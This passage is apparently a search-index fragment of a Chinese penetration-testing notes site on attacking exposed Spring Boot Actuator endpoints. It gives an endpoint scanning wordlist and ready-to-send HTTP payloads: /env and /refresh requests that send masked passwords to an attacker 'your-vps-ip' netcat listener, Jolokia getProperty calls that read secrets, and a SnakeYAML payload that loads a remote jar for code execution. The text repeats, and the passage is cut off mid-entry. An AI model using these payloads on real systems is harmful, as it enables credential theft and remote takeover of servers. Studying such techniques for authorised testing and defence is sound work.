Boot < 1.5\uff1a\u9ed8\u8ba4\u672a\u6388\u6743\u8bbf\u95ee\u6240\u6709\u7aef\u70b9 Spring Boot >= 1.5\uff1a\u9ed8\u8ba4\u53ea\u5141\u8bb8\u8bbf\u95ee /health \u548c /info \u7aef\u70b9\uff0c\u4f46\u662f\u6b64\u5b89\u5168\u6027\u901a\u5e38\u88ab\u5e94\u7528\u7a0b\u5e8f\u5f00\u53d1\u4eba\u5458\u7981\u7528\u4e86 \u5982\u4e0b\u662f\u4e3b\u8981\u626b\u63cfendpoint\u7684\u5b57\u5178 actuator actuator/auditLog actuator/auditevents actuator/autoconfig actuator/beans actuator/caches actuator/conditions actuator/configurationMetadata actuator/configprops actuator/dump actuator/env actuator/events actuator/exportRegisteredServices actuator/features actuator/flyway actuator/health actuator/heapdump actuator/healthcheck actuator/heapdump actuator/httptrace actuator/hystrix.stream actuator/info actuator/integrationgraph actuator/jolokia actuator/logfile actuator/loggers actuator/loggingConfig actuator/liquibase actuator/metrics actuator/mappings actuator/scheduledtasks actuator/swagger-ui.html actuator/prometheus actuator/refresh actuator/registeredServices actuator/releaseAttributes actuator/resolveAttributes actuator/scheduledtasks actuator/sessions actuator/springWebflow actuator/shutdown actuator/sso actuator/ssoSessions actuator/statistics actuator/status actuator/threaddump actuator/trace auditevents autoconfig api.html api/index.html api/swagger-ui.html api/v2/api-docs api-docs beans caches cloudfoundryapplication conditions configprops distv2/index.html docs druid/index.html druid/login.html druid/websession.html dubbo-provider/distv2/index.html dump entity/all env env/(name) eureka flyway gateway/actuator gateway/actuator/auditevents gateway/actuator/beans gateway/actuator/conditions gateway/actuator/configprops gateway/actuator/env gateway/actuator/health gateway/actuator/heapdump gateway/actuator/httptrace gateway/actuator/hystrix.stream gateway/actuator/info gateway/actuator/jolokia gateway/actuator/logfile gateway/actuator/loggers gateway/actuator/mappings gateway/actuator/metrics gateway/actuator/scheduledtasks gateway/actuator/swagger-ui.html gateway/actuator/threaddump gateway/actuator/trace health heapdump heapdump.json httptrace hystrix hystrix.stream info integrationgraph jolokia jolokia/list liquibase list logfile loggers liquibase metrics mappings monitor prometheus refresh scheduledtasks sessions shutdown spring-security-oauth-resource/swagger-ui.html spring-security-rest/api/swagger-ui.html static/swagger.json sw/swagger-ui.html swagger swagger/codes swagger/index.html swagger/static/index.html swagger/swagger-ui.html swagger-dubbo/api-docs swagger-ui swagger-ui.html swagger-ui/html swagger-ui/index.html system/druid/index.html threaddump template/swagger-ui.html trace user/swagger-ui.html version v1.1/swagger-ui.html v1.2/swagger-ui.html v1.3/swagger-ui.html v1.4/swagger-ui.html v1.5/swagger-ui.html v1.6/swagger-ui.html v1.7/swagger-ui.html /v1.8/swagger-ui.html /v1.9/swagger-ui.html /v2.0/swagger-ui.html v2.1/swagger-ui.html v2.2/swagger-ui.html v2.3/swagger-ui.html v2/swagger.json webpage/system/druid/index.html %20/swagger-ui.html \u8be6\u7ec6\u4e00\u70b9\u7684\u653b\u51fb\u624b\u6cd5 \u76f4\u63a5\u8bbf\u95ee/actuator\uff0c\u5982\u679c\u6709\u672a\u6388\u6743\u4f1a\u66b4\u9732\u6240\u6709\u7684\u53ef\u8bbf\u95ee\u7684endpoint \u6bd4\u8f83\u6709\u7528\u7684\u6709/env \u53ef\u80fd\u4f1a\u66b4\u9732\u5bc6\u7801\u4fe1\u606f\uff0c\u503c\u5f97\u6ce8\u610f\u7684\u662f\u901a\u8fc7\u5bf9/env \u53d1\u9001POST\u5305\uff0c\u53c8\u53ef\u80fd\u4f1a\u76f4\u63a5\u4fee\u6539/env\u91cc\u5bf9\u5e94\u952e\u7684\u503c\uff0c\u4ece\u800c\u9020\u6210\u5b89\u5168\u6f0f\u6d1e\u3002 /mappings \u66b4\u9732\u8def\u7531\u4fe1\u606f\u548c\u5bf9\u5e94\u63a7\u5236\u5668 /heapdump\u8bbf\u95eeJava\u8fdb\u7a0b\u5728\u67d0\u4e2a\u65f6\u95f4\u70b9\u4e0a\u7684\u5185\u5b58\u5feb\u7167\uff0c\u8bbf\u95ee\u540e\u4f1a\u4e0b\u8f7d\u5feb\u7167\u6587\u4ef6\uff0c\u53ef\u7528\u5de5\u5177 https://github.com/whwlsfb/JDumpSpider/releases \u6216 https://github.com/wyzxxz/heapdump_tool \u5bf9\u5185\u5b58\u8fdb\u884c\u5206\u6790 /trace \u83b7\u53d6\u4e00\u6bb5\u65f6\u95f4\u5185\u6240\u6709\u5bf9\u8be5\u7f51\u7ad9\u7684http\u8bf7\u6c42\u5305\uff0c\u53ef\u4ee5\u7ffb\u7ffb\u62ffcookie\u6216\u8005\u8ba4\u8bc1\u4fe1\u606f\u7b49\u3002 /refresh \uff0c\u6211\u4eec\u5bf9/env\u901a\u8fc7post\u53d1\u5305\u6539\u53d8\u5176\u952e\u503c\u4fe1\u606f\u540e\uff0c\u901a\u8fc7\u5bf9/refresh\u8fdb\u884cpost\u53d1\u5305\u5237\u65b0\u5c5e\u6027\u4fe1\u606f\uff0c\u4f7f\u952e\u503c\u4fe1\u606f\u751f\u6548\uff0c\u4ece\u800c\u5bfc\u81f4\u4e00\u4e9brce\u6f0f\u6d1e /restart\uff0c\u76f8\u5bf9\u8f83\u5c11\u66b4\u9732\uff0c\u5bf9/env\u901a\u8fc7post\u53d1\u5305\u6539\u53d8\u4fe1\u606f\u540e\uff0c\u5bf9\u8be5\u7aef\u70b9\u8fdb\u884cpost\u53d1\u5305\u91cd\u542f\u5e94\u7528\uff0c\u4ece\u800c\u5bfc\u81f4\u4e00\u4e9brce\u6f0f\u6d1e /jolokia \uff0c /jolokia/list \u83b7\u53d6mbean\u4fe1\u606f\uff0c\u95f4\u63a5\u89e6\u53d1rce\uff1b\u8fd8\u53ef\u4ee5\u83b7\u5f97/env\u91cc\u88ab\u661f\u53f7\u906e\u76d6\u7684\u654f\u611f\u4fe1\u606f /env \u661f\u53f7\u53bb\u9664 \u8bbf\u95ee /env \u63a5\u53e3\u65f6\uff0cspring actuator \u4f1a\u5c06\u4e00\u4e9b\u5e26\u6709\u654f\u611f\u5173\u952e\u8bcd(\u5982 password\u3001secret)\u7684\u5c5e\u6027\u540d\u5bf9\u5e94\u7684\u5c5e\u6027\u503c\u7528 * \u53f7\u66ff\u6362\u8fbe\u5230\u8131\u654f\u7684\u6548\u679c\u3002 \u62fc\u5199\u9519\u8bef \u7a0b\u5e8f\u5458\u62fc\u654f\u611f\u8bcd\u62fc\u9519\u4e86\uff0c\u6bd4\u5982password\u62fc\u6210passwd\u7b49\uff0c\u5c31\u6ca1\u6709\u661f\u53f7\u4e86 \u5229\u7528/heapdump \u5229\u7528\u6761\u4ef6\uff1a/heapdump\u672a\u6388\u6743\u8bbf\u95ee /heapdump\u53ef\u4ee5\u4e0b\u8f7d\u5185\u5b58\u5feb\u7167\uff0c\u4e0b\u8f7d\u4e0b\u6765\u540e\u7528\u5de5\u5177 https://github.com/whwlsfb/JDumpSpider/releases \u6216 https://github.com/wyzxxz/heapdump_tool \u5bf9\u5185\u5b58\u8fdb\u884c\u5206\u6790\uff0c\u641c\u7d22password\u7b49\u5173\u952e\u8bcd\u6765\u83b7\u53d6\u654f\u611f\u4fe1\u606f \u5229\u7528spring.cloud.bootstrap.location nc -lvk 80 vps\u5f00\u76d1\u542c spring 1.x POST /env Content-Type: application/x-www-form-urlencoded spring.cloud.bootstrap.location=http://your-vps-ip/?=${security.user.password} spring 2.x POST /actuator/env Content-Type: application/json {\"name\":\"spring.cloud.bootstrap.location\",\"value\":\"http://your-vps-ip/?=${security.user.password}\"} \u7136\u540e\u5237\u65b0\u914d\u7f6e\u5373\u53ef spring 1.x POST /refresh Content-Type: application/x-www-form-urlencoded spring 2.x POST /actuator/refresh Content-Type: application/json \u5229\u7528eureka.client.serviceUrl.defaultZone vps\u5f00\u542f\u76d1\u542c spring 1.x POST /env Content-Type: application/x-www-form-urlencoded eureka.client.serviceUrl.defaultZone=http://value:${security.user.password}@your-vps-ip spring 2.x POST /actuator/env Content-Type: application/json {\"name\":\"eureka.client.serviceUrl.defaultZone\",\"value\":\"http://value:${security.user.password}@your-vps-ip\"} \u7136\u540e\u5237\u65b0\u914d\u7f6e spring 1.x POST /refresh Content-Type: application/x-www-form-urlencoded spring 2.x POST /actuator/refresh Content-Type: application/json \u6b63\u5e38\u7684\u8bdd\uff0c\u6b64\u65f6 nc \u76d1\u542c\u7684\u670d\u52a1\u5668\u4f1a\u6536\u5230\u76ee\u6807\u53d1\u6765\u7684\u8bf7\u6c42\uff0c\u5176\u4e2d\u5305\u542b\u7c7b\u4f3c\u5982\u4e0b Authorization \u5934\u5185\u5bb9\uff1a Authorization: Basic dmFsdWU6MTIzNDU2 \u5c06\u5176\u4e2d\u7684 dmFsdWU6MTIzNDU2 \u90e8\u5206\u4f7f\u7528 base64 \u89e3\u7801\uff0c\u5373\u53ef\u83b7\u5f97\u7c7b\u4f3c\u660e\u6587\u503c value:123456 \uff0c\u5176\u4e2d\u7684 123456 \u5373\u662f\u76ee\u6807\u661f\u53f7 * \u8131\u654f\u524d\u7684\u5c5e\u6027\u503c\u660e\u6587\u3002 \u5229\u7528jolokia\u7684mbean jolokia\u5c31\u662f\u4e00\u4e2a\u76d1\u63a7jvm\u7684\u7ec4\u4ef6 \u5047\u8bbe\u6211\u4eec\u83b7\u53d6\u7684env\u7684\u503c\u4e3asecurity.user.password \u8c03\u7528 org.springframework.bootMbean \u5b9e\u9645\u4e0a\u662f\u8c03\u7528 org.springframework.boot.admin.SpringApplicationAdminMXBeanRegistrar \u7c7b\u5b9e\u4f8b\u7684 getProperty \u65b9\u6cd5 spring 1.x POST /jolokia Content-Type: application/json {\"mbean\": \"org.springframework.boot:name=SpringApplication,type=Admin\",\"operation\": \"getProperty\", \"type\": \"EXEC\", \"arguments\": [\"security.user.password\"]} spring 2.x POST /actuator/jolokia Content-Type: application/json {\"mbean\": \"org.springframework.boot:name=SpringApplication,type=Admin\",\"operation\": \"getProperty\", \"type\": \"EXEC\", \"arguments\": [\"security.user.password\"]} \u8c03\u7528 org.springframework.cloud.context.environmentMbean \u5b9e\u9645\u4e0a\u662f\u8c03\u7528 org.springframework.cloud.context.environment.EnvironmentManager \u7c7b\u5b9e\u4f8b\u7684 getProperty \u65b9\u6cd5 spring 1.x POST /jolokia Content-Type: application/json {\"mbean\": \"org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager\",\"operation\": \"getProperty\", \"type\": \"EXEC\", \"arguments\": [\"security.user.password\"]} spring 2.x POST /actuator/jolokia Content-Type: application/json {\"mbean\": \"org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager\",\"operation\": \"getProperty\", \"type\": \"EXEC\", \"arguments\": [\"security.user.password\"]} RCE\u6f0f\u6d1e https://www.freebuf.com/articles/web/271347.html \u60f3\u8981rce\uff0c\u8981\u4e48\u80fdpost\u8bbe\u7f6eenv\u5c5e\u6027\uff0c\u8981\u4e48\u6709jolokia\u63a5\u53e3\uff0c\u8981\u4e48\u6709/h2-console\u8def\u7531 spring cloud snakeyml # \u4f7f\u7528 python \u5feb\u901f\u5f00\u542f http server python2 -m SimpleHTTPServer 80 python3 -m http.server 80 \u5728\u7f51\u7ad9\u6839\u76ee\u5f55\u4e0b\u653e\u7f6e\u540e\u7f00\u4e3a yml\u7684\u6587\u4ef6 example.yml\uff0c\u5185\u5bb9\u5982\u4e0b\uff1a !!javax.script.ScriptEngineManager [ !!java.net.URLClassLoader [[ !!java.net.URL [\"http://your-vps-ip/example.jar\"] ]] ] \u5728\u7f51\u7ad9\u6839\u76ee\u5f55\u4e0b\u653e\u7f6e\u540e\u7f00\u4e3a jar \u7684\u6587\u4ef6 example.jar \uff0c\u5185\u5bb9\u662f\u8981\u6267\u884c\u7684\u4ee3\u7801\uff0c\u4ee3\u7801\u7f16\u5199\u53ca\u7f16\u8bd1\u65b9\u5f0f\u53c2\u8003 https://github.com/artsploit/yaml-payload \u8bbe\u7f6e spring.cloud.bootstrap.location \u5c5e\u6027 spring 1.x POST /env Content-Type: application/x-www-form-urlencoded spring.cloud.bootstrap.location=http://your-vps-ip/example.yml spring 2.x POST /actuator/env Content-Type: application/json {\"name\":\"spring.cloud.bootstrap.location\",\"value\":\"http://your-vps-ip/example.yml\"} \u5237\u65b0\u914d\u7f6e spring 1.x POST /refresh Content-Type: application/x-www-form-urlencoded spring 2.x POST /actuator/refresh Content-Type: application/json REF: https://wolke.cn/post/115ad433.html","title":"Spring Boot Actuator"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%A1%86%E6%9E%B6/Spring%20Boot/Spring%20Boot%20Actuator/Spring%20Boot%20Actuator/#spring-boot-actuator","text":"","title":"Spring Boot Actuator"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%A1%86%E6%9E%B6/Spring%20Boot/Spring%20Boot%20Actuator/Spring%20Boot%20Actuator/#_1","text":"\u7aef\u70b9 \u8be6\u7ec6\u4e00\u70b9\u7684\u653b\u51fb\u624b\u6cd5 /env \u661f\u53f7\u53bb\u9664 \u62fc\u5199\u9519\u8bef \u5229\u7528/heapdump \u5229\u7528spring.cloud.bootstrap.location \u5229\u7528eureka.client.serviceUrl.defaultZone \u5229\u7528jolokia\u7684mbean RCE\u6f0f\u6d1e spring cloud snakeyml REF: \u6279\u91cf\u626b\u63cf\uff1a https://github.com/AabyssZG/SpringBoot-Scan.git Actuator\u662fspring boot\u7684\u4e00\u4e2a\u76d1\u63a7\u6a21\u5757\uff0c\u5b83\u5b9a\u4e49\u4e86\u5f88\u591aendpoint\uff08\u7aef\u70b9\uff0c\u4e5f\u5c31\u662f\u4e00\u4e9b\u7279\u5b9a\u7684\u8def\u7531\uff09\u7528\u6765\u663e\u793a\u7edf\u8ba1\u6570\u636e\uff0c\u76d1\u63a7\u4fe1\u606f\u7b49\u3002 \u672c\u610f\u662f\u5e2e\u52a9\u5f00\u53d1\u4eba\u5458\u5bf9Spring\u670d\u52a1\u8fdb\u884c\u76d1\u63a7\u4ece\u800c\u8fdb\u884c\u7ef4\u62a4\u7b49\u64cd\u4f5c\uff0c\u4f46\u7531\u4e8eActuator\u53ef\u80fd\u5b58\u5728\u672a\u6388\u6743\u95ee\u9898\uff0c\u5bfc\u81f4\u8fd9\u4e9b\u654f\u611f\u4fe1\u606f\u4f1a\u66b4\u9732\u7ed9\u653b\u51fb\u8005\uff0c\u4ece\u800c\u9020\u6210\u6f5c\u5728\u7684\u653b\u51fb\u3002","title":"\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%A1%86%E6%9E%B6/Spring%20Boot/Spring%20Boot%20Actuator/Spring%20Boot%20Actuator/#_2","text":"Spring Boot < 1.5\uff1a\u9ed8\u8ba4\u672a\u6388\u6743\u8bbf\u95ee\u6240\u6709\u7aef\u70b9 Spring Boot >= 1.5\uff1a\u9ed8\u8ba4\u53ea\u5141\u8bb8\u8bbf\u95ee /health \u548c /info \u7aef\u70b9\uff0c\u4f46\u662f\u6b64\u5b89\u5168\u6027\u901a\u5e38\u88ab\u5e94\u7528\u7a0b\u5e8f\u5f00\u53d1\u4eba\u5458\u7981\u7528\u4e86 \u5982\u4e0b\u662f\u4e3b\u8981\u626b\u63cfendpoint\u7684\u5b57\u5178 actuator actuator/auditLog actuator/auditevents actuator/autoconfig actuator/beans actuator/caches actuator/conditions actuator/configurationMetadata actuator/configprops actuator/dump actuator/env actuator/events actuator/exportRegisteredServices actuator/features actuator/flyway actuator/health actuator/heapdump actuator/healthcheck actuator/heapdump actuator/httptrace actuator/hystrix.stream actuator/info actuator/integrationgraph actuator/jolokia actuator/logfile actuator/loggers actuator/loggingConfig actuator/liquibase actuator/metrics actuator/mappings actuator/scheduledtasks actuator/swagger-ui.html actuator/prometheus actuator/refresh actuator/registeredServices actuator/releaseAttributes actuator/resolveAttributes actuator/scheduledtasks actuator/sessions actuator/springWebflow actuator/shutdown actuator/sso actuator/ssoSessions actuator/statistics actuator/status actuator/threaddump actuator/trace auditevents autoconfig api.html api/index.html api/swagger-ui.html api/v2/api-docs api-docs beans caches cloudfoundryapplication conditions configprops distv2/index.html docs druid/index.html druid/login.html druid/websession.html dubbo-provider/distv2/index.html dump entity/all env env/(name) eureka flyway gateway/actuator gateway/actuator/auditevents gateway/actuator/beans gateway/actuator/conditions gateway/actuator/configprops gateway/actuator/env gateway/actuator/health gateway/actuator/heapdump gateway/actuator/httptrace gateway/actuator/hystrix.stream gateway/actuator/info gateway/actuator/jolokia gateway/actuator/logfile gateway/actuator/loggers gateway/actuator/mappings gateway/actuator/metrics gateway/actuator/scheduledtasks gateway/actuator/swagger-ui.html gateway/actuator/threaddump gateway/actuator/trace health heapdump heapdump.json httptrace hystrix hystrix.stream info integrationgraph jolokia jolokia/list liquibase list logfile loggers liquibase metrics mappings monitor prometheus refresh scheduledtasks sessions shutdown spring-security-oauth-resource/swagger-ui.html spring-security-rest/api/swagger-ui.html static/swagger.json sw/swagger-ui.html swagger swagger/codes swagger/index.html swagger/static/index.html swagger/swagger-ui.html swagger-dubbo/api-docs swagger-ui swagger-ui.html swagger-ui/html swagger-ui/index.html system/druid/index.html threaddump template/swagger-ui.html trace user/swagger-ui.html version v1.1/swagger-ui.html v1.2/swagger-ui.html v1.3/swagger-ui.html v1.4/swagger-ui.html v1.5/swagger-ui.html v1.6/swagger-ui.html v1.7/swagger-ui.html /v1.8/swagger-ui.html /v1.9/swagger-ui.html /v2.0/swagger-ui.html v2.1/swagger-ui.html v2.2/swagger-ui.html v2.3/swagger-ui.html v2/swagger.json webpage/system/druid/index.html %20/swagger-ui.html","title":"\u7aef\u70b9"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%A1%86%E6%9E%B6/Spring%20Boot/Spring%20Boot%20Actuator/Spring%20Boot%20Actuator/#_3","text":"\u76f4\u63a5\u8bbf\u95ee/actuator\uff0c\u5982\u679c\u6709\u672a\u6388\u6743\u4f1a\u66b4\u9732\u6240\u6709\u7684\u53ef\u8bbf\u95ee\u7684endpoint \u6bd4\u8f83\u6709\u7528\u7684\u6709/env \u53ef\u80fd\u4f1a\u66b4\u9732\u5bc6\u7801\u4fe1\u606f\uff0c\u503c\u5f97\u6ce8\u610f\u7684\u662f\u901a\u8fc7\u5bf9/env \u53d1\u9001POST\u5305\uff0c\u53c8\u53ef\u80fd\u4f1a\u76f4\u63a5\u4fee\u6539/env\u91cc\u5bf9\u5e94\u952e\u7684\u503c\uff0c\u4ece\u800c\u9020\u6210\u5b89\u5168\u6f0f\u6d1e\u3002 /mappings \u66b4\u9732\u8def\u7531\u4fe1\u606f\u548c\u5bf9\u5e94\u63a7\u5236\u5668 /heapdump\u8bbf\u95eeJava\u8fdb\u7a0b\u5728\u67d0\u4e2a\u65f6\u95f4\u70b9\u4e0a\u7684\u5185\u5b58\u5feb\u7167\uff0c\u8bbf\u95ee\u540e\u4f1a\u4e0b\u8f7d\u5feb\u7167\u6587\u4ef6\uff0c\u53ef\u7528\u5de5\u5177 https://github.com/whwlsfb/JDumpSpider/releases \u6216 https://github.com/wyzxxz/heapdump_tool \u5bf9\u5185\u5b58\u8fdb\u884c\u5206\u6790 /trace \u83b7\u53d6\u4e00\u6bb5\u65f6\u95f4\u5185\u6240\u6709\u5bf9\u8be5\u7f51\u7ad9\u7684http\u8bf7\u6c42\u5305\uff0c\u53ef\u4ee5\u7ffb\u7ffb\u62ffcookie\u6216\u8005\u8ba4\u8bc1\u4fe1\u606f\u7b49\u3002 /refresh \uff0c\u6211\u4eec\u5bf9/env\u901a\u8fc7post\u53d1\u5305\u6539\u53d8\u5176\u952e\u503c\u4fe1\u606f\u540e\uff0c\u901a\u8fc7\u5bf9/refresh\u8fdb\u884cpost\u53d1\u5305\u5237\u65b0\u5c5e\u6027\u4fe1\u606f\uff0c\u4f7f\u952e\u503c\u4fe1\u606f\u751f\u6548\uff0c\u4ece\u800c\u5bfc\u81f4\u4e00\u4e9brce\u6f0f\u6d1e /restart\uff0c\u76f8\u5bf9\u8f83\u5c11\u66b4\u9732\uff0c\u5bf9/env\u901a\u8fc7post\u53d1\u5305\u6539\u53d8\u4fe1\u606f\u540e\uff0c\u5bf9\u8be5\u7aef\u70b9\u8fdb\u884cpost\u53d1\u5305\u91cd\u542f\u5e94\u7528\uff0c\u4ece\u800c\u5bfc\u81f4\u4e00\u4e9brce\u6f0f\u6d1e /jolokia \uff0c /jolokia/list \u83b7\u53d6mbean\u4fe1\u606f\uff0c\u95f4\u63a5\u89e6\u53d1rce\uff1b\u8fd8\u53ef\u4ee5\u83b7\u5f97/env\u91cc\u88ab\u661f\u53f7\u906e\u76d6\u7684\u654f\u611f\u4fe1\u606f","title":"\u8be6\u7ec6\u4e00\u70b9\u7684\u653b\u51fb\u624b\u6cd5"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%A1%86%E6%9E%B6/Spring%20Boot/Spring%20Boot%20Actuator/Spring%20Boot%20Actuator/#env","text":"\u8bbf\u95ee /env \u63a5\u53e3\u65f6\uff0cspring actuator \u4f1a\u5c06\u4e00\u4e9b\u5e26\u6709\u654f\u611f\u5173\u952e\u8bcd(\u5982 password\u3001secret)\u7684\u5c5e\u6027\u540d\u5bf9\u5e94\u7684\u5c5e\u6027\u503c\u7528 * \u53f7\u66ff\u6362\u8fbe\u5230\u8131\u654f\u7684\u6548\u679c\u3002","title":"/env \u661f\u53f7\u53bb\u9664"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%A1%86%E6%9E%B6/Spring%20Boot/Spring%20Boot%20Actuator/Spring%20Boot%20Actuator/#_4","text":"\u7a0b\u5e8f\u5458\u62fc\u654f\u611f\u8bcd\u62fc\u9519\u4e86\uff0c\u6bd4\u5982password\u62fc\u6210passwd\u7b49\uff0c\u5c31\u6ca1\u6709\u661f\u53f7\u4e86","title":"\u62fc\u5199\u9519\u8bef"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%A1%86%E6%9E%B6/Spring%20Boot/Spring%20Boot%20Actuator/Spring%20Boot%20Actuator/#heapdump","text":"\u5229\u7528\u6761\u4ef6\uff1a/heapdump\u672a\u6388\u6743\u8bbf\u95ee /heapdump\u53ef\u4ee5\u4e0b\u8f7d\u5185\u5b58\u5feb\u7167\uff0c\u4e0b\u8f7d\u4e0b\u6765\u540e\u7528\u5de5\u5177 https://github.com/whwlsfb/JDumpSpider/releases \u6216 https://github.com/wyzxxz/heapdump_tool \u5bf9\u5185\u5b58\u8fdb\u884c\u5206\u6790\uff0c\u641c\u7d22password\u7b49\u5173\u952e\u8bcd\u6765\u83b7\u53d6\u654f\u611f\u4fe1\u606f","title":"\u5229\u7528/heapdump"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%A1%86%E6%9E%B6/Spring%20Boot/Spring%20Boot%20Actuator/Spring%20Boot%20Actuator/#springcloudbootstraplocation","text":"nc -lvk 80 vps\u5f00\u76d1\u542c spring 1.x POST /env Content-Type: application/x-www-form-urlencoded spring.cloud.bootstrap.location=http://your-vps-ip/?=${security.user.password} spring 2.x POST /actuator/env Content-Type: application/json {\"name\":\"spring.cloud.bootstrap.location\",\"value\":\"http://your-vps-ip/?=${security.user.password}\"} \u7136\u540e\u5237\u65b0\u914d\u7f6e\u5373\u53ef spring 1.x POST /refresh Content-Type: application/x-www-form-urlencoded spring 2.x POST /actuator/refresh Content-Type: application/json","title":"\u5229\u7528spring.cloud.bootstrap.location"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%A1%86%E6%9E%B6/Spring%20Boot/Spring%20Boot%20Actuator/Spring%20Boot%20Actuator/#eurekaclientserviceurldefaultzone","text":"vps\u5f00\u542f\u76d1\u542c spring 1.x POST /env Content-Type: application/x-www-form-urlencoded eureka.client.serviceUrl.defaultZone=http://value:${security.user.password}@your-vps-ip spring 2.x POST /actuator/env Content-Type: application/json {\"name\":\"eureka.client.serviceUrl.defaultZone\",\"value\":\"http://value:${security.user.password}@your-vps-ip\"} \u7136\u540e\u5237\u65b0\u914d\u7f6e spring 1.x POST /refresh Content-Type: application/x-www-form-urlencoded spring 2.x POST /actuator/refresh Content-Type: application/json \u6b63\u5e38\u7684\u8bdd\uff0c\u6b64\u65f6 nc \u76d1\u542c\u7684\u670d\u52a1\u5668\u4f1a\u6536\u5230\u76ee\u6807\u53d1\u6765\u7684\u8bf7\u6c42\uff0c\u5176\u4e2d\u5305\u542b\u7c7b\u4f3c\u5982\u4e0b Authorization \u5934\u5185\u5bb9\uff1a Authorization: Basic dmFsdWU6MTIzNDU2 \u5c06\u5176\u4e2d\u7684 dmFsdWU6MTIzNDU2 \u90e8\u5206\u4f7f\u7528 base64 \u89e3\u7801\uff0c\u5373\u53ef\u83b7\u5f97\u7c7b\u4f3c\u660e\u6587\u503c value:123456 \uff0c\u5176\u4e2d\u7684 123456 \u5373\u662f\u76ee\u6807\u661f\u53f7 * \u8131\u654f\u524d\u7684\u5c5e\u6027\u503c\u660e\u6587\u3002","title":"\u5229\u7528eureka.client.serviceUrl.defaultZone"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%A1%86%E6%9E%B6/Spring%20Boot/Spring%20Boot%20Actuator/Spring%20Boot%20Actuator/#jolokiambean","text":"jolokia\u5c31\u662f\u4e00\u4e2a\u76d1\u63a7jvm\u7684\u7ec4\u4ef6 \u5047\u8bbe\u6211\u4eec\u83b7\u53d6\u7684env\u7684\u503c\u4e3asecurity.user.password \u8c03\u7528 org.springframework.bootMbean \u5b9e\u9645\u4e0a\u662f\u8c03\u7528 org.springframework.boot.admin.SpringApplicationAdminMXBeanRegistrar \u7c7b\u5b9e\u4f8b\u7684 getProperty \u65b9\u6cd5 spring 1.x POST /jolokia Content-Type: application/json {\"mbean\": \"org.springframework.boot:name=SpringApplication,type=Admin\",\"operation\": \"getProperty\", \"type\": \"EXEC\", \"arguments\": [\"security.user.password\"]} spring 2.x POST /actuator/jolokia Content-Type: application/json {\"mbean\": \"org.springframework.boot:name=SpringApplication,type=Admin\",\"operation\": \"getProperty\", \"type\": \"EXEC\", \"arguments\": [\"security.user.password\"]} \u8c03\u7528 org.springframework.cloud.context.environmentMbean \u5b9e\u9645\u4e0a\u662f\u8c03\u7528 org.springframework.cloud.context.environment.EnvironmentManager \u7c7b\u5b9e\u4f8b\u7684 getProperty \u65b9\u6cd5 spring 1.x POST /jolokia Content-Type: application/json {\"mbean\": \"org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager\",\"operation\": \"getProperty\", \"type\": \"EXEC\", \"arguments\": [\"security.user.password\"]} spring 2.x POST /actuator/jolokia Content-Type: application/json {\"mbean\": \"org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager\",\"operation\": \"getProperty\", \"type\": \"EXEC\", \"arguments\": [\"security.user.password\"]}","title":"\u5229\u7528jolokia\u7684mbean"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%A1%86%E6%9E%B6/Spring%20Boot/Spring%20Boot%20Actuator/Spring%20Boot%20Actuator/#rce","text":"https://www.freebuf.com/articles/web/271347.html \u60f3\u8981rce\uff0c\u8981\u4e48\u80fdpost\u8bbe\u7f6eenv\u5c5e\u6027\uff0c\u8981\u4e48\u6709jolokia\u63a5\u53e3\uff0c\u8981\u4e48\u6709/h2-console\u8def\u7531","title":"RCE\u6f0f\u6d1e"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%A1%86%E6%9E%B6/Spring%20Boot/Spring%20Boot%20Actuator/Spring%20Boot%20Actuator/#spring-cloud-snakeyml","text":"# \u4f7f\u7528 python \u5feb\u901f\u5f00\u542f http server python2 -m SimpleHTTPServer 80 python3 -m http.server 80 \u5728\u7f51\u7ad9\u6839\u76ee\u5f55\u4e0b\u653e\u7f6e\u540e\u7f00\u4e3a yml\u7684\u6587\u4ef6 example.yml\uff0c\u5185\u5bb9\u5982\u4e0b\uff1a !!javax.script.ScriptEngineManager [ !!java.net.URLClassLoader [[ !!java.net.URL [\"http://your-vps-ip/example.jar\"] ]] ] \u5728\u7f51\u7ad9\u6839\u76ee\u5f55\u4e0b\u653e\u7f6e\u540e\u7f00\u4e3a jar \u7684\u6587\u4ef6 example.jar \uff0c\u5185\u5bb9\u662f\u8981\u6267\u884c\u7684\u4ee3\u7801\uff0c\u4ee3\u7801\u7f16\u5199\u53ca\u7f16\u8bd1\u65b9\u5f0f\u53c2\u8003 https://github.com/artsploit/yaml-payload \u8bbe\u7f6e spring.cloud.bootstrap.location \u5c5e\u6027 spring 1.x POST /env Content-Type: application/x-www-form-urlencoded spring.cloud.bootstrap.location=http://your-vps-ip/example.yml spring 2.x POST /actuator/env Content-Type: application/json {\"name\":\"spring.cloud.bootstrap.location\",\"value\":\"http://your-vps-ip/example.yml\"} \u5237\u65b0\u914d\u7f6e spring 1.x POST /refresh Content-Type: application/x-www-form-urlencoded spring 2.x POST /actuator/refresh Content-Type: application/json","title":"spring cloud 